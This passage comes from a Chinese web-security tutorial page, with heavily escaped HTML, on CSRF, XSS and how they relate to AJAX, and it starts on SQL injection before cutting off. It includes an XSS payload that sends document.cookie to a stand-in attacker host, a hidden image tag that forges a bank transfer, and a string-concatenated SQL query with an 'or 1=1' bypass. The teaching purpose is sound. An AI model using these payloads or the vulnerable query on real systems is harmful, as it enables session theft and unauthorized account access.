Referer字段（非常简单，但是鉴于客户端并不可信任，所以并不是很安全）\n（防止CSRF，检查Referer字段简单直接，但是其完全依赖浏览器发送正确的Referer字段。\n虽然http协议对此字段的内容有明确的规定，但并无法保证来访的浏览器的具体实现，\n亦无法保证浏览器没有安全漏洞影响到此字段。并且也存在攻击者攻击某些浏览器，篡改其Referer字段的可能。）\n\n\x3cspan class=\x22hljs-number\x22\x3e2.\x3c\/span\x3e 在请求地址中添加token并验证\n（譬如post中，以参数的形式加入一个随机产生的token）\x3c\/code\x3e\x3c\/pre\x3e\n\x3ch3 id=\x22articleHeader7\x22\x3eCSRF与AJAX的关系\x3c\/h3\x3e\n\x3cp\x3e上文中，我们看到CSRF的前提是cookie验证用户身份，那么它与AJAX的关系大么？\x3c\/p\x3e\n\x3cp\x3e我们先分析AJAX中带cookie验证的情况：\x3c\/p\x3e\n\x3cdiv class=\x22widget-codetool\x22 style=\x22display:none;\x22\x3e\n      \x3cdiv class=\x22widget-codetool--inner\x22\x3e\n      \x3cspan class=\x22selectCode code-tool\x22 data-toggle=\x22tooltip\x22 data-placement=\x22top\x22 title=\x22\x22 data-original-title=\x22全选\x22\x3e\x3c\/span\x3e\n      \x3cspan type=\x22button\x22 class=\x22copyCode code-tool\x22 data-toggle=\x22tooltip\x22 data-placement=\x22top\x22 data-clipboard-text=\x221. AJAX受到浏览器的同源策略限制\n\n2. AJAX默认无法请求跨域的接口\n（当然后台可以配置`Access-Control-Allow-Origin: *`之类的允许所有的跨域请求）\n\n3. AJAX请求无法携带跨域cookie\n（如果强行开启withCredentials，必须服务端配合认证，无法用作攻击）\x22 title=\x22\x22 data-original-title=\x22复制\x22\x3e\x3c\/span\x3e\n      \x3cspan type=\x22button\x22 class=\x22saveToNote code-tool\x22 data-toggle=\x22tooltip\x22 data-placement=\x22top\x22 title=\x22\x22 data-original-title=\x22放进笔记\x22\x3e\x3c\/span\x3e\n      \x3c\/div\x3e\n      \x3c\/div\x3e\x3cpre class=\x22javascript hljs\x22\x3e\x3ccode class=\x22js\x22\x3e\x3cspan class=\x22hljs-number\x22\x3e1.\x3c\/span\x3e AJAX受到浏览器的同源策略限制\n\n\x3cspan class=\x22hljs-number\x22\x3e2.\x3c\/span\x3e AJAX默认无法请求跨域的接口\n（当然后台可以配置\x3cspan class=\x22hljs-string\x22\x3e`Access-Control-Allow-Origin: *`\x3c\/span\x3e之类的允许所有的跨域请求）\n\n\x3cspan class=\x22hljs-number\x22\x3e3.\x3c\/span\x3e AJAX请求无法携带跨域cookie\n（如果强行开启withCredentials，必须服务端配合认证，无法用作攻击）\x3c\/code\x3e\x3c\/pre\x3e\n\x3cp\x3e嗯哼...看到这，基本就可以认为CSRF与AJAX请求无缘了。。。\x3c\/p\x3e\n\x3cp\x3e譬如假设上图中第\x3ccode\x3e4\x3c\/code\x3e部分的请求由AJAX发起，假设网站A已经允许了\x3ccode\x3eAccess-Control-Allow-Origin: *\x3c\/code\x3e，由于网站B与网站A是不同域名，所以存在跨域，根据同源策略，请求时根本就无法携带cookie，故而无法通过身份认证，攻击失败。。。\x3cbr\x3e就算强行开启withCredentials，携带跨域cookie，但是由于服务端并不会单独配置网站B的跨域cookie（需配置\x3ccode\x3eAccess-Control-Allow-Credentials: true\x3c\/code\x3e，而且这时候不允许设置\x3ccode\x3eAllow-Origin: *\x3c\/code\x3e），所以肯定认证失败\x3c\/p\x3e\n\x3cp\x3e可以看到，就算\x3ccode\x3eAccess-Control-Allow-Origin: *\x3c\/code\x3e允许所有来源的AJAX请求，跨域的cookie默认情况下仍然是无法携带的，无法CSRF\x3c\/p\x3e\n\x3cp\x3e所以说，结论是：\x3cstrong\x3eCSRF与AJAX无关\x3c\/strong\x3e\x3c\/p\x3e\n\x3ch3 id=\x22articleHeader8\x22\x3eXSS简介\x3c\/h3\x3e\n\x3cp\x3e既然CSRF与AJAX关系不大，那么XSS应该会与AJAX有很大关系吧？（要不然为什么一直说AJAX请求不安全，对吧。）。那么请继续看下去（本文中只限JS范畴）\x3c\/p\x3e\n\x3cp\x3eXSS（cross-site scripting），看起来简写应该是css更合适。。。但是为了和层叠式样式表区分，就用XSS简写表示\x3c\/p\x3e\n\x3cp\x3eXSS的特征也可以概括为：\x3cstrong\x3e跨域脚本注入，攻击者通过某种方式将恶意代码注入到网页上，然后其他用户观看到被注入的页面内容后会受到特定攻击\x3c\/strong\x3e\x3c\/p\x3e\n\x3cp\x3e相比CSRF，XSS囊括的内容更多，而且往往是多种攻击形式组合而成，这里以前文中介绍的几种为例：\x3c\/p\x3e\n\x3cp\x3e\x3cspan class=\x22img-wrap\x22\x3e\x3cimg data-src=\x22\/img\/remote\/1460000012693784?w=371\x26amp;h=430\x22 src=\x22https:\/\/static.alili.tech\/img\/remote\/1460000012693784?w=371\x26amp;h=430\x22 alt=\x22\x22 title=\x22\x22 style=\x22cursor: pointer;\x22\x3e\x3c\/span\x3e\x3c\/p\x3e\n\x3cp\x3e\x3cstrong\x3e1.cookie劫持\x3c\/strong\x3e\x3c\/p\x3e\n\x3cp\x3e同样，页面中有一个评论输入，输入后会，因为后台的漏洞，没有过滤特殊字符，会直接明文保存到数据库中，然后展示到网页时直接展示明文数据，那么如下\x3c\/p\x3e\n\x3cdiv class=\x22widget-codetool\x22 style=\x22display:none;\x22\x3e\n      \x3cdiv class=\x22widget-codetool--inner\x22\x3e\n      \x3cspan class=\x22selectCode code-tool\x22 data-toggle=\x22tooltip\x22 data-placement=\x22top\x22 title=\x22\x22 data-original-title=\x22全选\x22\x3e\x3c\/span\x3e\n      \x3cspan type=\x22button\x22 class=\x22copyCode code-tool\x22 data-toggle=\x22tooltip\x22 data-placement=\x22top\x22 data-clipboard-text=\x22\x3c%@ page language=\x26quot;java\x26quot; contentType=\x26quot;text\/html; charset=UTF-8\x26quot; pageEncoding=\x26quot;UTF-8\x26quot;%\x3e\n\x3cform action=\x26quot;saveComment.jsp\x26quot; method=\x26quot;post\x26quot;\x3e \n     请输入评论内容：\x3cBR\x3e \n     \x3cinput name=\x26quot;content\x26quot; type=\x26quot;text\x26quot;\x3e \n     \x3cinput type=\x26quot;submit\x26quot; value=\x26quot;确认\x26quot;\x3e\n\x3c\/form\x3e \x22 title=\x22\x22 data-original-title=\x22复制\x22\x3e\x3c\/span\x3e\n      \x3cspan type=\x22button\x22 class=\x22saveToNote code-tool\x22 data-toggle=\x22tooltip\x22 data-placement=\x22top\x22 title=\x22\x22 data-original-title=\x22放进笔记\x22\x3e\x3c\/span\x3e\n      \x3c\/div\x3e\n      \x3c\/div\x3e\x3cpre class=\x22xml hljs\x22\x3e\x3ccode class=\x22html\x22\x3e\x3cspan class=\x22hljs-tag\x22\x3e\x26lt;\x3cspan class=\x22hljs-name\x22\x3e%@\x3c\/span\x3e \x3cspan class=\x22hljs-attr\x22\x3epage\x3c\/span\x3e \x3cspan class=\x22hljs-attr\x22\x3elanguage\x3c\/span\x3e=\x3cspan class=\x22hljs-string\x22\x3e\x22java\x22\x3c\/span\x3e \x3cspan class=\x22hljs-attr\x22\x3econtentType\x3c\/span\x3e=\x3cspan class=\x22hljs-string\x22\x3e\x22text\/html; charset=UTF-8\x22\x3c\/span\x3e \x3cspan class=\x22hljs-attr\x22\x3epageEncoding\x3c\/span\x3e=\x3cspan class=\x22hljs-string\x22\x3e\x22UTF-8\x22\x3c\/span\x3e%\x26gt;\x3c\/span\x3e\n\x3cspan class=\x22hljs-tag\x22\x3e\x26lt;\x3cspan class=\x22hljs-name\x22\x3eform\x3c\/span\x3e \x3cspan class=\x22hljs-attr\x22\x3eaction\x3c\/span\x3e=\x3cspan class=\x22hljs-string\x22\x3e\x22saveComment.jsp\x22\x3c\/span\x3e \x3cspan class=\x22hljs-attr\x22\x3emethod\x3c\/span\x3e=\x3cspan class=\x22hljs-string\x22\x3e\x22post\x22\x3c\/span\x3e\x26gt;\x3c\/span\x3e \n     请输入评论内容：\x3cspan class=\x22hljs-tag\x22\x3e\x26lt;\x3cspan class=\x22hljs-name\x22\x3eBR\x3c\/span\x3e\x26gt;\x3c\/span\x3e \n     \x3cspan class=\x22hljs-tag\x22\x3e\x26lt;\x3cspan class=\x22hljs-name\x22\x3einput\x3c\/span\x3e \x3cspan class=\x22hljs-attr\x22\x3ename\x3c\/span\x3e=\x3cspan class=\x22hljs-string\x22\x3e\x22content\x22\x3c\/span\x3e \x3cspan class=\x22hljs-attr\x22\x3etype\x3c\/span\x3e=\x3cspan class=\x22hljs-string\x22\x3e\x22text\x22\x3c\/span\x3e\x26gt;\x3c\/span\x3e \n     \x3cspan class=\x22hljs-tag\x22\x3e\x26lt;\x3cspan class=\x22hljs-name\x22\x3einput\x3c\/span\x3e \x3cspan class=\x22hljs-attr\x22\x3etype\x3c\/span\x3e=\x3cspan class=\x22hljs-string\x22\x3e\x22submit\x22\x3c\/span\x3e \x3cspan class=\x22hljs-attr\x22\x3evalue\x3c\/span\x3e=\x3cspan class=\x22hljs-string\x22\x3e\x22确认\x22\x3c\/span\x3e\x26gt;\x3c\/span\x3e\n\x3cspan class=\x22hljs-tag\x22\x3e\x26lt;\/\x3cspan class=\x22hljs-name\x22\x3eform\x3c\/span\x3e\x26gt;\x3c\/span\x3e \x3c\/code\x3e\x3c\/pre\x3e\n\x3cp\x3e然后攻击者分析后，输入\x3c\/p\x3e\n\x3cdiv class=\x22widget-codetool\x22 style=\x22display:none;\x22\x3e\n      \x3cdiv class=\x22widget-codetool--inner\x22\x3e\n      \x3cspan class=\x22selectCode code-tool\x22 data-toggle=\x22tooltip\x22 data-placement=\x22top\x22 title=\x22\x22 data-original-title=\x22全选\x22\x3e\x3c\/span\x3e\n      \x3cspan type=\x22button\x22 class=\x22copyCode code-tool\x22 data-toggle=\x22tooltip\x22 data-placement=\x22top\x22 data-clipboard-text=\x22\x3cscript\x3ewindow.open(\x26quot;http:\/\/www.attackpage.com\/record?secret=\x26quot; \x2b document.cookie)\x3c\/script\x3e\x22 title=\x22\x22 data-original-title=\x22复制\x22\x3e\x3c\/span\x3e\n      \x3cspan type=\x22button\x22 class=\x22saveToNote code-tool\x22 data-toggle=\x22tooltip\x22 data-placement=\x22top\x22 title=\x22\x22 data-original-title=\x22放进笔记\x22\x3e\x3c\/span\x3e\n      \x3c\/div\x3e\n      \x3c\/div\x3e\x3cpre class=\x22xml hljs\x22\x3e\x3ccode class=\x22html\x22 style=\x22word-break: break-word; white-space: initial;\x22\x3e\x3cspan class=\x22hljs-tag\x22\x3e\x26lt;\x3cspan class=\x22hljs-name\x22\x3escript\x3c\/span\x3e\x26gt;\x3c\/span\x3e\x3cspan class=\x22javascript\x22\x3e\x3cspan class=\x22hljs-built_in\x22\x3ewindow\x3c\/span\x3e.open(\x3cspan class=\x22hljs-string\x22\x3e\x22http:\/\/www.attackpage.com\/record?secret=\x22\x3c\/span\x3e \x2b \x3cspan class=\x22hljs-built_in\x22\x3edocument\x3c\/span\x3e.cookie)\x3c\/span\x3e\x3cspan class=\x22hljs-tag\x22\x3e\x26lt;\/\x3cspan class=\x22hljs-name\x22\x3escript\x3c\/span\x3e\x26gt;\x3c\/span\x3e\x3c\/code\x3e\x3c\/pre\x3e\n\x3cp\x3e保存文章。很简单的代码，由于没有过滤脚本，那么其它用户登陆后，在看到这篇文章时就会自动将他们的cookie信息都发送到了攻击者的服务器。\x3cbr\x3e攻击者可以在cookie（譬如jsessionid对应的session）有效期内拿它们冒充用户操作。\x3c\/p\x3e\n\x3cp\x3e需要注意，这里和CSRF的区别是，这里是拿到了cookie后主动冒充用户的，而CSRF中根本就不知cookie，仅利用浏览器的隐式校验方式冒充用户。\x3c\/p\x3e\n\x3cp\x3e\x3cstrong\x3e2.会话伪造\x3c\/strong\x3e\x3c\/p\x3e\n\x3cp\x3e同样是评论漏洞的示例。\x3c\/p\x3e\n\x3cp\x3e攻击者输入（举例比喻）\x3c\/p\x3e\n\x3cdiv class=\x22widget-codetool\x22 style=\x22display:none;\x22\x3e\n      \x3cdiv class=\x22widget-codetool--inner\x22\x3e\n      \x3cspan class=\x22selectCode code-tool\x22 data-toggle=\x22tooltip\x22 data-placement=\x22top\x22 title=\x22\x22 data-original-title=\x22全选\x22\x3e\x3c\/span\x3e\n      \x3cspan type=\x22button\x22 class=\x22copyCode code-tool\x22 data-toggle=\x22tooltip\x22 data-placement=\x22top\x22 data-clipboard-text=\x22\x3cimg src=http:\/\/www.bank.example\/transfer?toBankId=hello\x26amp;amount=1000000 width=\x270\x27 height=\x270\x27\x3e\x22 title=\x22\x22 data-original-title=\x22复制\x22\x3e\x3c\/span\x3e\n      \x3cspan type=\x22button\x22 class=\x22saveToNote code-tool\x22 data-toggle=\x22tooltip\x22 data-placement=\x22top\x22 title=\x22\x22 data-original-title=\x22放进笔记\x22\x3e\x3c\/span\x3e\n      \x3c\/div\x3e\n      \x3c\/div\x3e\x3cpre class=\x22xml hljs\x22\x3e\x3ccode class=\x22html\x22 style=\x22word-break: break-word; white-space: initial;\x22\x3e\x3cspan class=\x22hljs-tag\x22\x3e\x26lt;\x3cspan class=\x22hljs-name\x22\x3eimg\x3c\/span\x3e \x3cspan class=\x22hljs-attr\x22\x3esrc\x3c\/span\x3e=\x3cspan class=\x22hljs-string\x22\x3ehttp:\/\/www.bank.example\/transfer?toBankId\x3c\/span\x3e=\x3cspan class=\x22hljs-string\x22\x3ehello\x26amp;amount\x3c\/span\x3e=\x3cspan class=\x22hljs-string\x22\x3e1000000\x3c\/span\x3e \x3cspan class=\x22hljs-attr\x22\x3ewidth\x3c\/span\x3e=\x3cspan class=\x22hljs-string\x22\x3e\x270\x27\x3c\/span\x3e \x3cspan class=\x22hljs-attr\x22\x3eheight\x3c\/span\x3e=\x3cspan class=\x22hljs-string\x22\x3e\x270\x27\x3c\/span\x3e\x26gt;\x3c\/span\x3e\x3c\/code\x3e\x3c\/pre\x3e\n\x3cp\x3e然后，接下来发生的故事就和CSRF中提到的一致。这种情况就是基于XSS而开展的CSRF，也有人喜欢称之为XSRF\x3c\/p\x3e\n\x3cp\x3e需要注意，这里并没有自己拿到cookie，而是CSRF中提到的利用浏览器的隐式验证机制来冒充用户。\x3c\/p\x3e\n\x3cp\x3e\x3cstrong\x3e3.其它恶意代码执行\x3c\/strong\x3e\x3c\/p\x3e\n\x3cp\x3e其实上面的cookie劫持以及会话伪造都算是恶意代码执行，为了区别，这里就专指前端的流氓JS。\x3c\/p\x3e\n\x3cp\x3e譬如前面的评论中的输入可以是：\x3c\/p\x3e\n\x3cdiv class=\x22widget-codetool\x22 style=\x22display:none;\x22\x3e\n      \x3cdiv class=\x22widget-codetool--inner\x22\x3e\n      \x3cspan class=\x22selectCode code-tool\x22 data-toggle=\x22tooltip\x22 data-placement=\x22top\x22 title=\x22\x22 data-original-title=\x22全选\x22\x3e\x3c\/span\x3e\n      \x3cspan type=\x22button\x22 class=\x22copyCode code-tool\x22 data-toggle=\x22tooltip\x22 data-placement=\x22top\x22 data-clipboard-text=\x22譬如市面上盛行的网页游戏弹窗等。\n譬如干脆直接让这个页面卡死都可以。\n譬如无限循环。\x22 title=\x22\x22 data-original-title=\x22复制\x22\x3e\x3c\/span\x3e\n      \x3cspan type=\x22button\x22 class=\x22saveToNote code-tool\x22 data-toggle=\x22tooltip\x22 data-placement=\x22top\x22 title=\x22\x22 data-original-title=\x22放进笔记\x22\x3e\x3c\/span\x3e\n      \x3c\/div\x3e\n      \x3c\/div\x3e\x3cpre class=\x22javascript hljs\x22\x3e\x3ccode class=\x22js\x22\x3e譬如市面上盛行的网页游戏弹窗等。\n譬如干脆直接让这个页面卡死都可以。\n譬如无限循环。\x3c\/code\x3e\x3c\/pre\x3e\n\x3cp\x3e这里再提一点，上述都是从前端输入作为入口的，但实际上有一类的输入也不可忽视，那就是：\x3ccode\x3e富文本攻击\x3c\/code\x3e\x3c\/p\x3e\n\x3cp\x3e它的特点就是： \x3cstrong\x3e富文本中注入了脚本，并且前后端未进行过滤，导致直接输出到了页面中\x3c\/strong\x3e\x3c\/p\x3e\n\x3cp\x3e因为存在很多页面，都是将富文本内容展示到网页上的，没有进行过滤（哪怕时至今日，仍然有不少页面），这样只要富文本中有注入脚本，基本就中招了。。。\x3c\/p\x3e\n\x3cp\x3e\x3cstrong\x3e结论：\x3c\/strong\x3e\x3c\/p\x3e\n\x3cp\x3e\x3cstrong\x3e只要最终能向页面输出可执行的脚本语句，那么就是有漏洞，XSS攻击都有可能发生。\x3c\/strong\x3e\x3c\/p\x3e\n\x3cp\x3e而且，基本上xss漏洞是很广泛的，虽然攻击类型很被动，也需要大量时间分析，但胜在大量的网站上都存在（特别是那种长期不更新的）\x3c\/p\x3e\n\x3cp\x3e再提一点。上述的介绍更多的是从造成的后果来看，但其实如果从攻击手动来看的话可以分为几大类型：\x3ccode\x3e反射型XSS攻击\x3c\/code\x3e（直接通过URL注入，而且很多浏览器都自带防御），\x3ccode\x3e存储型XSS攻击\x3c\/code\x3e（存储到DB后读取时注入），还有一个\x3ccode\x3eDOM-Based型\x3c\/code\x3e。\x3c\/p\x3e\n\x3cp\x3e上述示例中都是存储型，具体更多内容网上已经有很详细的资料，这里不再继续深入，放一张图巩固下。\x3c\/p\x3e\n\x3cp\x3e\x3cspan class=\x22img-wrap\x22\x3e\x3cimg data-src=\x22\/img\/remote\/1460000012693785?w=1031\x26amp;h=767\x22 src=\x22https:\/\/static.alili.tech\/img\/remote\/1460000012693785?w=1031\x26amp;h=767\x22 alt=\x22\x22 title=\x22\x22 style=\x22cursor: pointer;\x22\x3e\x3c\/span\x3e\x3c\/p\x3e\n\x3cp\x3e\x3cstrong\x3e如何预防XSS：\x3c\/strong\x3e\x3c\/p\x3e\n\x3cul\x3e\x3cli\x3e输入过滤，不信任用户的任何输入，过滤其中的“\x26lt;”、“\x26gt;”、“\/”等可能导致脚本注入的特殊字符，\x3c\/li\x3e\x3c\/ul\x3e\n\x3cp\x3e或者过滤“script”、“javascript”等脚本关键字，或者对输入数据的长度进行限制等等，\x3cbr\x3e还得考虑攻击者使用十六进制编码来输入脚本的方式。\x3c\/p\x3e\n\x3cul\x3e\n\x3cli\x3e输出进行编码，和输入过滤类似，不过是从输出上着手，数据输出到页面时，经过HtmlEncoder等工具编码，这样就不会存在直接输出可执行的脚本了\x3c\/li\x3e\n\x3cli\x3ecookie设置\x3ccode\x3ehttp-only\x3c\/code\x3e，这样用脚本就无法获取cookie了\x3c\/li\x3e\n\x3c\/ul\x3e\n\x3cp\x3e（这样只有浏览器向Web服务器发起请求的时才会带上cookie字段，避免了XSS攻击利用JavaScript的document.cookie获取cookie）\x3c\/p\x3e\n\x3cul\x3e\x3cli\x3eCookie防盗，尽可能地避免在Cookie中泄露隐私，如用户名、密码等；\x3c\/li\x3e\x3c\/ul\x3e\n\x3cp\x3e或者，为了防止重放攻击，可以将Cookie和IP进行绑定，这样也可以阻止攻击者冒充正常用户的身份。\x3c\/p\x3e\n\x3cul\x3e\x3cli\x3e注意，特别是后台，一定不能信任前端的输入，需要过滤与校验\x3c\/li\x3e\x3c\/ul\x3e\n\x3ch3 id=\x22articleHeader9\x22\x3eXSS与AJAX的关系\x3c\/h3\x3e\n\x3cp\x3e以上分析了XSS造成一些影响与问题，仍然发现：\x3cstrong\x3e与AJAX关系不大\x3c\/strong\x3e，因为这些问题不管用不用AJAX都会发生。\x3c\/p\x3e\n\x3cp\x3e看看这种情况，譬如上述的富文本注入中：\x3c\/p\x3e\n\x3cdiv class=\x22widget-codetool\x22 style=\x22display:none;\x22\x3e\n      \x3cdiv class=\x22widget-codetool--inner\x22\x3e\n      \x3cspan class=\x22selectCode code-tool\x22 data-toggle=\x22tooltip\x22 data-placement=\x22top\x22 title=\x22\x22 data-original-title=\x22全选\x22\x3e\x3c\/span\x3e\n      \x3cspan type=\x22button\x22 class=\x22copyCode code-tool\x22 data-toggle=\x22tooltip\x22 data-placement=\x22top\x22 data-clipboard-text=\x221. 某个接口采用AJAX交互\n\n2. AJAX请求完后将对应富文本字段显示到了页面上-譬如innerHTML\x22 title=\x22\x22 data-original-title=\x22复制\x22\x3e\x3c\/span\x3e\n      \x3cspan type=\x22button\x22 class=\x22saveToNote code-tool\x22 data-toggle=\x22tooltip\x22 data-placement=\x22top\x22 title=\x22\x22 data-original-title=\x22放进笔记\x22\x3e\x3c\/span\x3e\n      \x3c\/div\x3e\n      \x3c\/div\x3e\x3cpre class=\x22javascript hljs\x22\x3e\x3ccode class=\x22js\x22\x3e\x3cspan class=\x22hljs-number\x22\x3e1.\x3c\/span\x3e 某个接口采用AJAX交互\n\n\x3cspan class=\x22hljs-number\x22\x3e2.\x3c\/span\x3e AJAX请求完后将对应富文本字段显示到了页面上-譬如innerHTML\x3c\/code\x3e\x3c\/pre\x3e\n\x3cp\x3e但是，这真的与AJAX无关，这是前后端没有进行输入输出过滤而造成的后果。\x3c\/p\x3e\n\x3cp\x3e所以，还是那句话：\x3cstrong\x3e如果某个Web应用具备良好的安全性，那么再怎么用“不安全的AJAX”也削弱不了它的安全性，反之如果应用本身存在漏洞，不管用何种技术请求，它都是不安全的\x3c\/strong\x3e\x3c\/p\x3e\n\x3ch3 id=\x22articleHeader10\x22\x3eSQL注入简介\x3c\/h3\x3e\n\x3cp\x3esql注入展开将也是一门很大的学问，很早以前更是大行其道（当然，现在...），这里仅仅举几个最极端的示例。\x3c\/p\x3e\n\x3cp\x3e\x3cstrong\x3e前提是后台没有过滤前端的输入数据，否则根本无法生效\x3c\/strong\x3e\x3c\/p\x3e\n\x3cp\x3e假设页面A中有一个登陆查询存在拙劣的sql注入漏洞，这样子的：（最极端，最傻的情况）\x3c\/p\x3e\n\x3cdiv class=\x22widget-codetool\x22 style=\x22display:none;\x22\x3e\n      \x3cdiv class=\x22widget-codetool--inner\x22\x3e\n      \x3cspan class=\x22selectCode code-tool\x22 data-toggle=\x22tooltip\x22 data-placement=\x22top\x22 title=\x22\x22 data-original-title=\x22全选\x22\x3e\x3c\/span\x3e\n      \x3cspan type=\x22button\x22 class=\x22copyCode code-tool\x22 data-toggle=\x22tooltip\x22 data-placement=\x22top\x22 data-clipboard-text=\x22\x3c%@ page language=\x26quot;java\x26quot; contentType=\x26quot;text\/html; charset=UTF-8\x26quot; pageEncoding=\x26quot;UTF-8\x26quot;%\x3e\n\x3cform action=\x26quot;login.jsp\x26quot; method=\x26quot;post\x26quot;\x3e \n     请输入用户名与密码：\x3cBR\x3e \n     \x3cinput name=\x26quot;name\x26quot; type=\x26quot;text\x26quot;\x3e \n     \x3cinput name=\x26quot;password\x26quot; type=\x26quot;text\x26quot;\x3e \n     \x3cinput type=\x26quot;submit\x26quot; value=\x26quot;登陆\x26quot;\x3e\n\x3c\/form\x3e \x22 title=\x22\x22 data-original-title=\x22复制\x22\x3e\x3c\/span\x3e\n      \x3cspan type=\x22button\x22 class=\x22saveToNote code-tool\x22 data-toggle=\x22tooltip\x22 data-placement=\x22top\x22 title=\x22\x22 data-original-title=\x22放进笔记\x22\x3e\x3c\/span\x3e\n      \x3c\/div\x3e\n      \x3c\/div\x3e\x3cpre class=\x22xml hljs\x22\x3e\x3ccode class=\x22html\x22\x3e\x3cspan class=\x22hljs-tag\x22\x3e\x26lt;\x3cspan class=\x22hljs-name\x22\x3e%@\x3c\/span\x3e \x3cspan class=\x22hljs-attr\x22\x3epage\x3c\/span\x3e \x3cspan class=\x22hljs-attr\x22\x3elanguage\x3c\/span\x3e=\x3cspan class=\x22hljs-string\x22\x3e\x22java\x22\x3c\/span\x3e \x3cspan class=\x22hljs-attr\x22\x3econtentType\x3c\/span\x3e=\x3cspan class=\x22hljs-string\x22\x3e\x22text\/html; charset=UTF-8\x22\x3c\/span\x3e \x3cspan class=\x22hljs-attr\x22\x3epageEncoding\x3c\/span\x3e=\x3cspan class=\x22hljs-string\x22\x3e\x22UTF-8\x22\x3c\/span\x3e%\x26gt;\x3c\/span\x3e\n\x3cspan class=\x22hljs-tag\x22\x3e\x26lt;\x3cspan class=\x22hljs-name\x22\x3eform\x3c\/span\x3e \x3cspan class=\x22hljs-attr\x22\x3eaction\x3c\/span\x3e=\x3cspan class=\x22hljs-string\x22\x3e\x22login.jsp\x22\x3c\/span\x3e \x3cspan class=\x22hljs-attr\x22\x3emethod\x3c\/span\x3e=\x3cspan class=\x22hljs-string\x22\x3e\x22post\x22\x3c\/span\x3e\x26gt;\x3c\/span\x3e \n     请输入用户名与密码：\x3cspan class=\x22hljs-tag\x22\x3e\x26lt;\x3cspan class=\x22hljs-name\x22\x3eBR\x3c\/span\x3e\x26gt;\x3c\/span\x3e \n     \x3cspan class=\x22hljs-tag\x22\x3e\x26lt;\x3cspan class=\x22hljs-name\x22\x3einput\x3c\/span\x3e \x3cspan class=\x22hljs-attr\x22\x3ename\x3c\/span\x3e=\x3cspan class=\x22hljs-string\x22\x3e\x22name\x22\x3c\/span\x3e \x3cspan class=\x22hljs-attr\x22\x3etype\x3c\/span\x3e=\x3cspan class=\x22hljs-string\x22\x3e\x22text\x22\x3c\/span\x3e\x26gt;\x3c\/span\x3e \n     \x3cspan class=\x22hljs-tag\x22\x3e\x26lt;\x3cspan class=\x22hljs-name\x22\x3einput\x3c\/span\x3e \x3cspan class=\x22hljs-attr\x22\x3ename\x3c\/span\x3e=\x3cspan class=\x22hljs-string\x22\x3e\x22password\x22\x3c\/span\x3e \x3cspan class=\x22hljs-attr\x22\x3etype\x3c\/span\x3e=\x3cspan class=\x22hljs-string\x22\x3e\x22text\x22\x3c\/span\x3e\x26gt;\x3c\/span\x3e \n     \x3cspan class=\x22hljs-tag\x22\x3e\x26lt;\x3cspan class=\x22hljs-name\x22\x3einput\x3c\/span\x3e \x3cspan class=\x22hljs-attr\x22\x3etype\x3c\/span\x3e=\x3cspan class=\x22hljs-string\x22\x3e\x22submit\x22\x3c\/span\x3e \x3cspan class=\x22hljs-attr\x22\x3evalue\x3c\/span\x3e=\x3cspan class=\x22hljs-string\x22\x3e\x22登陆\x22\x3c\/span\x3e\x26gt;\x3c\/span\x3e\n\x3cspan class=\x22hljs-tag\x22\x3e\x26lt;\/\x3cspan class=\x22hljs-name\x22\x3eform\x3c\/span\x3e\x26gt;\x3c\/span\x3e \x3c\/code\x3e\x3c\/pre\x3e\n\x3cp\x3e在接收到登陆请求后，服务端的实际执行代码时是：\x3c\/p\x3e\n\x3cdiv class=\x22widget-codetool\x22 style=\x22display:none;\x22\x3e\n      \x3cdiv class=\x22widget-codetool--inner\x22\x3e\n      \x3cspan class=\x22selectCode code-tool\x22 data-toggle=\x22tooltip\x22 data-placement=\x22top\x22 title=\x22\x22 data-original-title=\x22全选\x22\x3e\x3c\/span\x3e\n      \x3cspan type=\x22button\x22 class=\x22copyCode code-tool\x22 data-toggle=\x22tooltip\x22 data-placement=\x22top\x22 data-clipboard-text=\x22String sql = \x26quot;SELECT * FROM  users  WHERE name = \x27\x26quot; \x2b name \x2b \x26quot;\x27 AND password = \x27\x26quot; \x2b password \x2b \x26quot;\x27\x26quot;;\x22 title=\x22\x22 data-original-title=\x22复制\x22\x3e\x3c\/span\x3e\n      \x3cspan type=\x22button\x22 class=\x22saveToNote code-tool\x22 data-toggle=\x22tooltip\x22 data-placement=\x22top\x22 title=\x22\x22 data-original-title=\x22放进笔记\x22\x3e\x3c\/span\x3e\n      \x3c\/div\x3e\n      \x3c\/div\x3e\x3cpre class=\x22javascript hljs\x22\x3e\x3ccode class=\x22js\x22 style=\x22word-break: break-word; white-space: initial;\x22\x3e\x3cspan class=\x22hljs-built_in\x22\x3eString\x3c\/span\x3e sql = \x3cspan class=\x22hljs-string\x22\x3e\x22SELECT * FROM  users  WHERE name = \x27\x22\x3c\/span\x3e \x2b name \x2b \x3cspan class=\x22hljs-string\x22\x3e\x22\x27 AND password = \x27\x22\x3c\/span\x3e \x2b password \x2b \x3cspan class=\x22hljs-string\x22\x3e\x22\x27\x22\x3c\/span\x3e;\x3c\/code\x3e\x3c\/pre\x3e\n\x3cp\x3e然而有攻击者分析出后台可能存在漏洞，尝试sql注入攻击，输入\x3c\/p\x3e\n\x3cdiv class=\x22widget-codetool\x22 style=\x22display:none;\x22\x3e\n      \x3cdiv class=\x22widget-codetool--inner\x22\x3e\n      \x3cspan class=\x22selectCode code-tool\x22 data-toggle=\x22tooltip\x22 data-placement=\x22top\x22 title=\x22\x22 data-original-title=\x22全选\x22\x3e\x3c\/span\x3e\n      \x3cspan type=\x22button\x22 class=\x22copyCode code-tool\x22 data-toggle=\x22tooltip\x22 data-placement=\x22top\x22 data-clipboard-text=\x22name = \x27\x27\npassword = \x27\x27  or 1=1\x22 title=\x22\x22 data-original-title=\x22复制\x22\x3e\x3c\/span\x3e\n      \x3cspan type=\x22button\x22 class=\x22saveToNote code-tool\x22 data-toggle=\x22tooltip\x22 data-placement=\x22top\x22 title=\x22\x22 data-original-title=\x22放进笔记\x22\x3e\x3c\/span\x3e\n      \x3c\/div\x3e\n      \x3c\/div\x3e\x3cpre class=\x22javascript hljs\x22\x3e\x3ccode class=\x22js\x22\x3ename = \x3cspan class=\x22hljs-string\x22\x3e\x27\x27\x3c\/span\x3e\npassword = \x3cspan class=\x22hljs-string\x22\x3e\x27\x27\x3c\/span\x3e  or \x3cspan class=\x22hljs-number\x22\x3e1\x3c\/span\x3e=\x3cspan class=\x22hljs-number\x22\x3e1\x3c\/span\x3e\x3c\/code\x3e\x3c\/pre\x3e\n\x3cp\x3e那么这样，后台接收到数据后，实际上查询的结果是\x3c\/p\x3e\n\x3cdiv class=\x22widget-codetool\x22 style=\x22display:none;\x22\x3e\n      \x3cdiv class=\x22widget-codetool--inner\x22\x3e\n      \x3cspan class=\x22selectCode code-tool\x22 data-toggle=\x22tooltip\x22 data-placement=\x22top\x22 title=\x22\x22 